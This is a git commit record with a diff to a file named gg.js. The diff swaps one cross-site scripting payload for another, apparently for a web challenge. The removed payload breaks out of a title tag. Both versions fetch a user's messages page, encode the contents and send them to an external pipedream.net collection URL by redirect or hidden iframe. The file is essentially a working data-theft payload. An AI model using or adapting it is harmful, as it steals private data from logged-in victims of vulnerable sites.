a835a40f2c9e86fdadd6fb94bc7c02bfd2a34a1d
hefrcoo <150366484+hefrcoo@users.noreply.github.com>
2025-10-03 22:37:35 +0200

    Update gg.js

--- gg.js
+++ gg.js
@@ -1,12 +1,1 @@
-</title><script>
-(async()=>{
-  let r = await fetch("/messages?id=1", { credentials: "include" });
-  let j = await r.json();
-  let u = "https://eoeipamgnflz15n.m.pipedream.net?c=" + encodeURIComponent(btoa(JSON.stringify(j)));
-  let i = document.createElement("iframe");
-  i.src = u;
-  i.style = "width:1px;height:1px;position:absolute;top:0;left:0;";
-  document.body.appendChild(i);
-  window.location = u;
-})()
-</script><title>
+(async()=>{let t=await (await fetch('/messages?id=1')).text();window.location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)})();
